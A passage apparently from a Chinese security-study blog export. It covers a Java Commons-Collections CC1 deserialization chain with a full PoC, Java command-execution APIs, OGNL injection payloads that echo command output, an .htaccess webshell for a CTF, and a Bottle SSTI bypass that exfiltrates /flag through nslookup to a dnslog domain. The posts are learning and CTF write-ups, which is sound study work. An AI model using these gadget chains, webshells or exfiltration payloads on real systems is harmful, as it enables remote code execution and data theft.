ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class);          //作为最开始的输入传入，其他的都是互相嵌套而已。\n\n\n\n2.if语句问题我开始认为那两个if语句只要是正常情况下就会通过，没想到到头来还要自己去触发\nif (memberType != null) &#123;  // i.e. member still exists    Object value = memberValue.getValue();    if (!(memberType.isInstance(value) ||          value instanceof ExceptionProxy)) &#123;        memberValue.setValue(            new AnnotationTypeMismatchExceptionProxy(                value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(                    annotationType.members().get(name)));    &#125;\n\n虽然现在我们还无法控制setValue的参数，但是还是先触发函数了再说\n在 readObject()方法处下断点，发现未通过第一个 if条件的限制，原因为 memberType为空：\n\n\n先是看到代码\nannotationType = AnnotationType.getInstance(type);\n\n从type中获取了一个注解对象实例，AnnotationType是专门用于对注解类型进行操作的类。\n我们往上面的代码看，发现type在构造方法中可以被赋值\nAnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();    if (!type.isAnnotation() ||        superInterfaces.length != 1 ||        superInterfaces[0] != java.lang.annotation.Annotation.class)        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);    this.type = type;    this.memberValues = memberValues;&#125;\n\n我们可以传入对应的注解类型赋值到type中，我们的memberValues也是在这里被赋值的\n于是我们再来看\nMap&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();//获取annotationType中的memberTypes\n\n仔细看一下annotationType的内容，我对注解的理解就是一个标签然后写在不同的类型上面，然后在代码允许的时候会反射调用然后然会注解获取的信息，比如@Override - 检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误\n然后这其中的成员即memberTypes就是用来传递一些配置信息的，虽然我不知道有什么用\n// 对于 @Target 注解：memberTypes = &#123;    &quot;value&quot;: ElementType[].class    // ↑              ↑    // 成员名         返回值类型（ElementType数组）&#125;// 对于更复杂的注解：@interface ComplexAnnotation &#123;    String name();    int count();    Class&lt;?&gt; type();    String[] tags();&#125;// 对应的memberTypes：memberTypes = &#123;    &quot;name&quot;: String.class,    &quot;count&quot;: int.class,     &quot;type&quot;: Class.class,    &quot;tags&quot;: String[].class&#125;\n\n然后我们再来看两个if\nif (memberType != null) &#123;  // i.e. member still exists    Object value = memberValue.getValue();    if (!(memberType.isInstance(value) ||          value instanceof ExceptionProxy)) &#123;        memberValue.setValue(            new AnnotationTypeMismatchExceptionProxy(                value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(                    annotationType.members().get(name)));    &#125;&#125;\n\n首先就是我们传递进入的那个注解成员是不能是空的，比如Override注解成员就是空的\n\n\n我们只需要传入成员非空的注解即可\n\n\n然后我们注意到这个Target的成员名是value，前面还有代码\nString name = memberValue.getKey();Class&lt;?&gt; memberType = memberTypes.get(name);\n\n会获取我们传入Map的键，然后通过键再去memberType中找成员然后再来判断，于是我们需要传入value为键\n\n\n然后就是第二个判断了\n(!(memberType.isInstance(value) ||value instanceof ExceptionProxy))\n\n\n确保类型不匹配 - 传入与注解成员类型不同的对象\n确保不是ExceptionProxy - 传入普通对象\n\n这个应该是默认就是可以触发的\n3.setValue里的value不可控的问题这个是setValue的参数\nnew AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name))\n\n这个一看就不可控，好像没有什么可以改的地方\n然后大佬说是用ConstantTransformer的构造方法和重写的Transformer来解决，我们去看下\npublic Object transform(Object input) &#123;    return iConstant;&#125;public ConstantTransformer(Object constantToReturn) &#123;    super();    iConstant = constantToReturn;&#125;\n\n\n\n这个transform方法可以直接返回我们的输入，但是还是看不懂，让我重新整理一下\n首先我们是没有办法直接改变setValue的参数了，于是我们只能选择执行setValue方法，然后我们继续最终setValue的参数，发现其参数是作为checksetValue的参数，然后checksetValue又把参数传递个最后的transform方法作为类，于是我们直接通过参数来肯定是不行的\n这个时候我们就想起了解决序列化问题的时候使用到的ChainedTransformer类了，可以通过写入数组的方式调用各个类的transform方法，当初我们是手动传入了一个反射\nchainedTransformer.transform(Runtime.class);    \n\n也就是说我们只要有一个transform方法可以返回这个反射即可实现通过调用ChainedTransformer的transform来实现命令执行，而原先setValue那条用于触发函数执行transform的路线改变方向用来触发ChainedTransformer的transform来再次触发InvokerTransformer的transform进行命令执行\n于是我们利用ConstantTransformer的构造方法和transformer来返回Runtime.class\n直接来看Poc链\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class CC1 &#123;    public static void main(String[] args) throws Exception &#123;        //序列化InvokerTransformer，反射调用exec函数执行命令。        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer =  new ChainedTransformer(transformers);        //Map类的构建与修饰        HashMap&lt;Object,Object&gt; inmap = new HashMap&lt;&gt;();        inmap.put(&quot;value&quot;,&quot;aaa&quot;);        Map outmap = TransformedMap.decorate(inmap,null,chainedTransformer);//到checkSetValue的时候触发chainedTransformer的transformer//然后decorate返回的是一个TransformedMap对象，然后将后面要用到的inmap写入对象中        //遍历map，触发链子        Class handler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor constructorhandler = handler.getDeclaredConstructor(Class.class, Map.class);        constructorhandler.setAccessible(true);        Object obj = constructorhandler.newInstance(Target.class,outmap);//写入我们准备好的参数和用于调用过if判断和调用setValue的TransformedMap对象作为参数，然后通过反射获取对象        serialize(obj);    &#125;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;serialize&quot;));//进行序列化        oos.writeObject(obj);    &#125;&#125;\n\n然后最后我再总结一下这个链子的触发流程\n通过反射获取AnnotationInvocationHandler对象-&gt;序列化-&gt;反序列化的时候触发readObject方法-&gt;过两个if判断-&gt;会遍历我们的传入的TransformedMap对象的键值对调用setValue方法-&gt;遍历到MapEntry的时候触发setValue方法-&gt;触发TransformedMap的checkSetValue方法-&gt;调用ChainedTransformer的transform方法-&gt;通过数组中的操作进行命令执行\n\n\n\n\n\n4.总结最后再提供一下触发代码来实践一下成果\nimport java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unserializeTest &#123;    public static void main(String[] arge) throws Exception&#123;    unserialize(&quot;serialize&quot;);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;\n\n这个代码读取当前目录下的serialize文件然后弹出计算器\n\n\n花了我三天多的时间终于把这个链个复原了，虽然全是跟着大佬来，自己没写多少代码，这就是初学者的痛吗，累死我了\n"},{"title":"JAVA命令执行","url":"/2025/07/20/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"JAVA命令执行前言java代码也基本可以看懂了，但是还是和以前遇到的问题一样，太多函数和包都不知道，只能先把代码看看\njava中命令执行有三种方式\n1.java.lang.Runtime特点：\n\n最传统的方法，直接调用系统命令。\n需要手动处理输入&#x2F;输出流。\n\nimport java.io.BufferedReader;//用于包装InputStreamReader，提供各种读取功能import java.io.InputStreamReader;//用于读取输入字符串//引入包public class RuntimeExecExample &#123;    public static void main(String[] args) &#123;        try &#123;            // 执行命令（例如：Linux/Mac 的 `ls` 或 Windows 的 `dir`）            Process process = Runtime.getRuntime().exec(&quot;ls -l&quot;);//先通过Runtime.getRuntime()获取到Runtime对象//通过.exec()开启进程，最后返回一个Process对象            // 读取命令输出            BufferedReader reader = new BufferedReader(                new InputStreamReader(process.getInputStream())            );//先通过process.getInputStream提取出子进程中的标准输出//然后再通过InputStreamReader读取输入，再通过BufferedReader提供读取方式            String line;            while ((line = reader.readLine()) != null) &#123;                System.out.println(line);//调用readLine()方法读取输出，如果不为空则输出结果            &#125;            // 等待命令执行完成            int exitCode = process.waitFor();            System.out.println(&quot;Exit Code: &quot; + exitCode);        &#125; catch (Exception e) &#123;            e.printStackTrace();//处理错误输出        &#125;    &#125;&#125;\n\n可见这个方法是通过getRuntime():获取到Runtime对象，然后调用exec开启子进程并执行命令然后把执行结果返回到Process对象中，后续再通过process.getInputStream()获取到子进程的标准输出\n2.java.lang.ProcessBuilder特点：\n\n更安全的命令执行方式，支持参数化输入，也支持普通输入。\n可以设置工作目录、环境变量等。\n\nimport java.io.BufferedReader;import java.io.InputStreamReader;import java.util.Arrays;public class ProcessBuilderExample &#123;    public static void main(String[] args) &#123;        try &#123;            // 使用 ProcessBuilder 执行命令（参数拆分为数组）            ProcessBuilder pb = new ProcessBuilder(&quot;ls&quot;, &quot;-l&quot;);//这个对象不是创建子进程而是通过这个对象安全配置子进程参数            pb.redirectErrorStream(true); // 合并标准输出和错误输出            Process process = pb.start();//而是通过ProcessBuilder类的start();方法开启子进程返回process对象            // 读取输出            BufferedReader reader = new BufferedReader(                new InputStreamReader(process.getInputStream())            );            String line;            while ((line = reader.readLine()) != null) &#123;                System.out.println(line);            &#125;            // 等待命令完成            int exitCode = process.waitFor();            System.out.println(&quot;Exit Code: &quot; + exitCode);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n由于ProcessBuilder可以进程参数命令执行，我们就需要了解一下这个解析方式\n\n规则：\n命令和每个参数作为字符串数组的独立元素传递。\n参数中的空格、引号、特殊字符（如 |、&amp;）会被视为普通字符，不会触发 Shell 解析。\n\n\n安全性：\n从根本上避免命令注入（因为参数不会被 Shell 解释）。\n\n\n\n原理就是将第一个参数（&quot;ls&quot;）作为可执行文件路径或名称（通过 PATH 环境变量查找）也就是我们平时ls，cat等命令都是通过环境变量中的可执行文件使用的\n后面参数（&quot;-l&quot;, &quot;my dir&quot;）就按顺序传递给程序，由于后续参数不会触发shell解析，而且参数中的各种特殊符号也被视为普通字符，导致我们无法进行命令注入，但是这个实际上也是分情况才能防止命令注入的。\n直接调用程序（不通过 Shell）：参数按原样传递，不会被解析（安全）。\njava\nnew ProcessBuilder(&quot;echo&quot;, &quot;hello&amp;calc.exe&quot;).start();\n\n\n输出：hello&amp;calc.exe （纯文本，不会执行 calc.exe）。\n\n通过 Shell 调用（如 cmd.exe 或 /bin/sh）：参数中的特殊字符 会被 Shell 解析（危险！）。\njava\nnew ProcessBuilder(&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;echo hello&amp;calc.exe&quot;).start();\n\n\n输出：hello 并弹出计算器（&amp; 被解析为命令分隔符）。\n\n\n\n\n场景\n示例命令\n是否解析特殊字符\n安全性\n\n\n\n直接调用程序\nnew ProcessBuilder(&quot;echo&quot;, &quot;a&amp;&amp;b&quot;)\n❌ 不解析\n✅ 安全\n\n\n通过 cmd.exe 调用\nnew ProcessBuilder(&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;echo a&amp;&amp;b&quot;)\n✅ 解析 (&amp;&amp;)\n❌ 危险\n\n\n通过 /bin/sh 调用\nnew ProcessBuilder(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo a&amp;&amp;b&quot;)\n✅ 解析 (&amp;&amp;)\n❌ 危险\n\n\n3.java.lang.ProcessImpl看博主说ProcessBuilder.star()是在底层调用了ProcessImpl.start()方法，但是在java.jang包中ProcessImpl不止punblic属性的，只能在java.lang包中使用\n在包外实例化是不能的了，但是可以通过反射的方法去调用到这个类的方法\npublic class ProcessImplTest &#123;    public static void main(String[] args) throws Exception&#123;        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);        Method start = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);        start.setAccessible(true);        start.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, null, null, false);    &#125;\n\n使用反射还是太麻烦了，后面遇到再学一下吧\n"},{"title":"Java_OGNL表达式注入","url":"/2025/10/19/Java-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","content":"Java_OGNL表达式注入闲着没事做，想去写一下Java的题目，结果没想到一个都看不懂，基础的东西是一点都不会，只能从最基本的表达式学起了\n1.OGNL是什么Class SchoolMaster&#123;    String name = &quot;wanghua&quot;;&#125;Class School&#123;    String name = &quot;tsinghua&quot;;    SchoolMaster schoolMaster;&#125;Class Student&#123;    String name = &quot;xiaoming&quot;;    School school;&#125;\n\n创建实例学校school = new School()、学生student = new Student()和校长schoolMaster = new SchoolMaster()，将学校校长指定为schoolMaster实例-school.schoolMaster = schoolMaster，学生的学校指定为school实例-student.school = school，那么三者就连接起来了形成了一个对象图，对象图基本可以理解为对象之间的依赖图。通过对象图我们可以获取到对象的属性甚至对象的方法。\n那么OGNL就是实现对象图导航语言，全称Object-Graph Navigation Language。通过它我们可以存取 Java对象的任意属性、调用 Java 对象的方法以及实现类型转换等。\n2.OGNL三元素OGNL基本使用方法示例：\n// 创建Student对象School school = new School();school.setName(&quot;tsinghua&quot;);school.setSchoolMaster(new SchoolMaster(&quot;wanghua&quot;));Student student1 = new Student();student1.setName(&quot;xiaoming&quot;);student1.setSchool(school);Student student2 = new Student();student2.setName(&quot;zhangsan&quot;);student2.setSchool(school);// 创建上下文环境 一个特殊变量OgnlContext context = new OgnlContext();// 设置跟对象rootcontext.setRoot(student1);//将这个对象命名为stdent2然后放入上下文中context.put(&quot;student2&quot;, student2);// 获取ognl的root相关值Object name1 = Ognl.getValue(&quot;name&quot;, context, context.getRoot());//context用于设置上下文,context.getRoot()用于设置根对象,也可以是其他对象Object school1 = Ognl.getValue(&quot;school.name&quot;, context, context.getRoot());Object schoolMaster1 = Ognl.getValue(&quot;school.schoolMaster.name&quot;, context, context.getRoot());System.out.println(name1 + &quot;:学校-&quot; + school1 + &quot;,校长-&quot;+schoolMaster1);// 获取ognl非root相关值Object name2 = Ognl.getValue(&quot;#student2.name&quot;, context, context.getRoot());Object school2 = Ognl.getValue(&quot;#student2.school.name&quot;, context, context.getRoot());Object schoolMaster2 = Ognl.getValue(&quot;#student2.school.schoolMaster.name&quot;, context, context.getRoot());System.out.println(name2 + &quot;:学校-&quot; + school2 + &quot;,校长-&quot;+schoolMaster2);\n\n输出结果：\nxiaoming:学校-tsinghua,校长-wanghuazhangsan:学校-tsinghua,校长-wanghua\n\n不难看出，OGNL getValue需要三元素：expression表达式、context上下文及root对象。那么什么是三元素：\nexpression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定对谁进行操作；context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作在哪里。\n\n在上面示例中，根对象是student1实例，context中设置了根对象和非根对象student2，表达式有name、school.name、school.schoolMaster.name和student2.name、#student2.school.name、student2.school.schoolMaster.name，前三个是通过表达式获取root也就是student1对象的相关属性，后三个是通过表达式获取容器变量student2对象的相关属性\n我们需要注意的是一个上下文中如果不加符号的话就直接在根对象中查找，想要在上下文中查找首先需要通过put方法将对象写入上下文，然后再使用#，就会跳过根对象，去上下文的对象中查找\n3.OGNL表达式语法1.符号的使用在上一部分我们已经接触了.和#符号在表达式中的使用，通过.可以获取对象属性，#可以获取非root的Student对象。\nOGNL表达式支持Java基本运算，所以运算符+、-、*、/、%等在OGNL都是支持的，另外还支持in、eq、gt等。\n除了基本运算符，.、@、#在OGNL中都有特殊含义。\n1、通过.获取对象的属性或方法：\nstudentstudent.namestudent.schoolstudent.school.namestudent.takingClasses(&quot;英语&quot;)\n\n\n\n2、三种类型对象的获取：\n静态对象、静态方法和静态变量：@\n//语法基本结构 @完整类名@方法名(参数)@java.lang.System@getProperty(&quot;user.dir&quot;)@java.lang.Math@abs(-111)\n\n非原生类型对象：#\n#student.name#student.takingClasses(&quot;英语&quot;)\n\n简单对象：直接获取\n&quot;string&quot;.lenth5true\n\n\n\n3、%符号的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。\n4、$在配置文件中引用OGNL表达式。\n2.集合表达式new创建实例：\nnew java.lang.String(&quot;testnew&quot;)\n\n&#123;&#125;和[]的用法：\n在OGNL中，可以用&#123;&#125;或者它的组合来创建列表、数组和map，[]可以获取下标元素。\n创建list：&#123;value1,value2...&#125;\n&#123;1,3,5&#125;[1]\n\n创建数组：new type[]&#123;value1,value2...&#125;\nnew int[]&#123;1,3,5&#125;[0]\n\n创建map：#&#123;key:value,key1:value1...&#125;\n#&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;school&quot;:&quot;tsinghua&quot;&#125;[&quot;school&quot;]\n\n除了一些符号和集合，还支持Projection投影和Selection选择等，具体可参考官方文档：https://commons.apache.org/proper/commons-ognl/language-guide.html 附录Operators部分。\n4.命令执行调试分析我看了一下其他payload，我感觉还是有必要收集一些payload的\n通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：\n@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)//通过@访问静态方法 由于Runtime是private属性，所以通过new则改为使用Process(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()\n\n我们这个方法虽然可以进行命令执行，但是命令执行的输出是不能直接返回到我们的HTTP请求中的，我们需要将命令执行结果写入输出流，然后将输出导向HttpServletResponse来实现利用Struts实现输出\n但是这样就需要会写Java代码，我的java就是依托答辩啊，难为我了\n%&#123;  // 第一步：执行命令  #cmd = &quot;env&quot;  #process = @java.lang.Runtime@getRuntime().exec(#cmd)    // 第二步：读取命令输出// 获取进程的标准输出流（命令执行的结果从这里读取）  #input = #process.getInputStream()// 创建 Scanner 对象来方便地读取流内容 同时会将字节流转化为字符流  #scanner = new java.util.Scanner(#input)  #scanner.useDelimiter(&quot;\\\\A&quot;)  // 读取所有内容  // 设置分隔符为 &quot;\\\\A&quot;（正则表达式，表示输入流的开头）  // 这样 scanner.next() 就会一次性读取所有内容，而不是逐行读取  #result = #scanner.hasNext() ? #scanner.next() : &quot;无输出&quot;    // 第三步：输出到HTTP响应 // 从 Struts2 上下文获取 HTTP 响应对象  #response = #context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;)  // 从响应对象获取输出写入器，用于向HTTP响应体写入数据  #writer = #response.getWriter()  #writer.println(#result)  #writer.flush()  #writer.close()&#125;\n\n也就是我们先创建一个进程用来命令执行，然后再通过读取这个进程的输出流来存入变量中，然后再通过往HTTP响应对象中写入数据实现输出\n实际上使用起来就是，注意语句之间必须使用逗号隔开\n%&#123;  #cmd = &quot;env&quot;,  #process = @java.lang.Runtime@getRuntime().exec(#cmd),  #input = #process.getInputStream(),  #scanner = new java.util.Scanner(#input),  #scanner.useDelimiter(&quot;\\\\A&quot;),  #result = #scanner.hasNext() ? #scanner.next() : &quot;无输出&quot;,  #response = #context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),  #writer = #response.getWriter(),  #writer.println(#result),  #writer.flush(),  #writer.close()&#125;\n\n\n\n然后我们再来开发一些其他写法\n%&#123;  #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),  #b=#a.getInputStream(), // 创建 InputStreamReader 将字节流转换为字符流  字节流：原始二进制数据 → 字符流：可读的文本数据  #c=new java.io.InputStreamReader(#b),  #d=new java.io.BufferedReader(#c),// 创建足够大的字符数组来存储命令输出  #e=new char[50000],// 将命令输出读取到字符数组 #e 中  #d.read(#e),  #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),  #f.getWriter().println(new java.lang.String(#e)),  #f.getWriter().flush(),  #f.getWriter().close()&#125;\n\n使用版\n%&#123;  #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),  #b=#a.getInputStream(),  #c=new java.io.InputStreamReader(#b),  #d=new java.io.BufferedReader(#c),  #e=new char[50000],  #d.read(#e),  #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),  #f.getWriter().println(new java.lang.String(#e)),  #f.getWriter().flush(),  #f.getWriter().close()&#125;\n\n\n\n\n\n"},{"title":"[JMCTF_2021]UploadHub","url":"/2025/06/08/JMCTF-2021-UploadHub/","content":"[JMCTF_2021]UploadHub这个题目看似是一个文件上传的题目，但是我发现可以直接上传php文件，以为有了，但是点开后发现似乎未被解析，代码都直接在网页上了，使用蚁剑连接也不行。于是这肯定不是简单的文件上传，只能看wp了\n这题还给了源码，我们看下\n发现源码中有apache2.conf\n&lt;Directory ~ &quot;/var/www/html/upload/[a-f0-9]&#123;32&#125;/&quot;&gt;        php_flag engine off&lt;/Directory&gt;\n\n这里面的php_flag engine off指的是网页中所有文件都不能被作为php解析。\n但是这作为apache配置文件，我们自然也可以上传apache配置文件htaccess\n既然其他文件不能被作为php解析，那我们就直接使用.htaccess文件进行自我包含即可\n&lt;FilesMatch .htaccess&gt;SetHandler application/x-httpd-php Require all granted  php_flag engine on\t&lt;/FilesMatch&gt;php_value auto_prepend_file .htaccess#&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n\n\n我们使用了配置项php_flag engine on让在访问这个文件的时候可以作为php解析\n这段 .htaccess 文件的内容是一个恶意配置，旨在通过Apache的配置文件实现PHP代码执行\n我们之前见过.htaccess文件自己包含自己的题目，但是这个题目好像有点不一样，在配置文件中设置了所有文件都不能被解析为php，但是我们可以通过.htaccess文件改变这个项\n&lt;FilesMatch .htaccess&gt;    SetHandler application/x-httpd-php  # 将.htaccess文件当作PHP脚本解析    Require all granted                # 允许所有访问（绕过权限限制）    php_flag engine on                 # 强制开启PHP引擎（即使被全局关闭）&lt;/FilesMatch&gt;\n\n\n\n\n\n但是这个题目，有个问题就是不仅phpinfo中显示过滤了系统命令函数，还会过一下就清理文件，我们得重新上传，于是我们只能在被清理前使用file_get_contents去读取flag，或直接代码读取\n&lt;FilesMatch .htaccess&gt;SetHandler application/x-httpd-php Require all granted  php_flag engine on\t&lt;/FilesMatch&gt;php_value auto_prepend_file .htaccess#&lt;?php var_dump(file_get_contents(&#x27;/flag&#x27;));?&gt;\n\n\n"},{"title":"LiCTF2025","url":"/2025/08/23/LiCTF2025/","content":"LiCTF2025web1.ez_bottle这个题目直接给了源码我们下载下来\nfrom bottle import route, run, template, post, request, static_file, errorimport osimport zipfileimport hashlibimport time# hint: flag in /flag , have a tryUPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#x27;uploads&#x27;)os.makedirs(UPLOAD_DIR, exist_ok=True)STATIC_DIR = os.path.join(os.path.dirname(__file__), &#x27;static&#x27;)MAX_FILE_SIZE = 1 * 1024 * 1024BLACK_DICT = [&quot;&#123;&quot;, &quot;&#125;&quot;, &quot;os&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;sock&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;bul&quot;, &quot;class&quot;, &quot;?&quot;, &quot;:&quot;, &quot;bash&quot;, &quot;_&quot;, &quot;globals&quot;,              &quot;get&quot;, &quot;open&quot;]  #黑名单def contains_blacklist(content):    return any(black in content for black in BLACK_DICT)def is_symlink(zipinfo):    return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000def is_safe_path(base_dir, target_path):    return os.path.realpath(target_path).startswith(os.path.realpath(base_dir))@route(&#x27;/&#x27;)def index():    return static_file(&#x27;index.html&#x27;, root=STATIC_DIR)@route(&#x27;/static/&lt;filename&gt;&#x27;)def server_static(filename):    return static_file(filename, root=STATIC_DIR)@route(&#x27;/upload&#x27;)def upload_page():    return static_file(&#x27;upload.html&#x27;, root=STATIC_DIR)@post(&#x27;/upload&#x27;)def upload():    zip_file = request.files.get(&#x27;file&#x27;)    if not zip_file or not zip_file.filename.endswith(&#x27;.zip&#x27;):   #判断文件是否是zip后缀        return &#x27;Invalid file. Please upload a ZIP file.&#x27;    if len(zip_file.file.read()) &gt; MAX_FILE_SIZE:       #判断文件大小，这个没什么用        return &#x27;File size exceeds 1MB. Please upload a smaller ZIP file.&#x27;    zip_file.file.seek(0)    current_time = str(time.time())    unique_string = zip_file.filename + current_time    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)    os.makedirs(extract_dir)#通过时间戳和md5加密生成文件目录     zip_path = os.path.join(extract_dir, &#x27;upload.zip&#x27;)    zip_file.save(zip_path)#保存文件    try:        with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as z:            for file_info in z.infolist():                if is_symlink(file_info):                       return &#x27;Symbolic links are not allowed.&#x27;  #检查文件信息中是否有软链接，正常上传都不会被拦截                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))#防止文件名的目录遍历                if not is_safe_path(extract_dir, real_dest_path):  #对特殊字符进行过滤                    return &#x27;Path traversal detected.&#x27;            z.extractall(extract_dir)    except zipfile.BadZipFile:        return &#x27;Invalid ZIP file.&#x27;    files = os.listdir(extract_dir)    files.remove(&#x27;upload.zip&#x27;)    return template(&quot;文件列表: &#123;&#123;files&#125;&#125;\\n访问: /view/&#123;&#123;md5&#125;&#125;/&#123;&#123;first_file&#125;&#125;&quot;,                    files=&quot;, &quot;.join(files), md5=md5_hash, first_file=files[0] if files else &quot;nofile&quot;)@route(&#x27;/view/&lt;md5&gt;/&lt;filename&gt;&#x27;)def view_file(md5, filename):    file_path = os.path.join(UPLOAD_DIR, md5, filename)    if not os.path.exists(file_path):        return &quot;File not found.&quot;    with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        content = f.read()    if contains_blacklist(content):        return &quot;you are hacker!!!nonono!!!&quot;#访问我们的解压出来的文件的时候对文件内容进行黑名单过滤    try:        return template(content)#进行模板渲染    except Exception as e:        return f&quot;Error rendering template: &#123;str(e)&#125;&quot;@error(404)def error404(error):    return &quot;bbbbbboooottle&quot;@error(403)def error403(error):    return &quot;Forbidden: You don&#x27;t have permission to access this resource.&quot;if __name__ == &#x27;__main__&#x27;:    run(host=&#x27;0.0.0.0&#x27;, port=5000, debug=False)\n\n从最后的模板渲染可以看出来这是一个SSTI的题目，但是这里不是flask而是bottle，我不知道payload，其次就是对我们的上传的一个zip文件有着比较严格的过滤，首先就是把目录跨越给过滤掉了，所以我们只能上传正常的zip文件\n关键在于SSTI，这个是黑名单\nBLACK_DICT = [&quot;&#123;&quot;, &quot;&#125;&quot;, &quot;os&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;sock&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;bul&quot;, &quot;class&quot;, &quot;?&quot;, &quot;:&quot;, &quot;bash&quot;, &quot;_&quot;, &quot;globals&quot;,              &quot;get&quot;, &quot;open&quot;]\n\n由于把很多用于命令执行的模块给过滤了，经过测试还没有回显，那就只能通过外带了\n% import subprocess% subprocess.run(&quot;nslookup `cat /flag`.swljm3.dnslog.cn&quot;, shell=True)\n\n这是我问了GPT好久最后终于可以使用的payload，通过subprocess模块中的run方法发送请求，再通过反引号执行命令。前面加一个%应该是bottle模板渲染的语法，和直接写python代码相似。\n我们将payload保存到flag.txt中然后压缩为zip文件，最后通过前端代码实现文件上传\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://gz.imxbt.cn:20812/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;&lt;!--name要根据题目的源码来调节--&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n上传文件后获得文件路径\n\n\n访问文件后即可进行dnslog外带，但是不知道是不是什么问题，之前还行现在我拿不到了，但是命令还是可以执行的，只是没回显\n2.Ekko_note真不敢想象这是给24年的新生的比赛，这对吗。这个题目还是个签到题，我给跪了为什么当初要打CTF\n我们先来看源代码，实际上是实现了登录注册忘记密码等功能\n# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   app.py@Time    :   2066/07/05 19:20:29@Author  :   Ekko exec inc. 某牛马程序员 &#x27;&#x27;&#x27;import osimport timeimport uuidimport requestsfrom functools import wrapsfrom datetime import datetimefrom secrets import token_urlsafefrom flask_sqlalchemy import SQLAlchemyfrom werkzeug.security import generate_password_hash, check_password_hashfrom flask import Flask, render_template, redirect, url_for, request, flash, 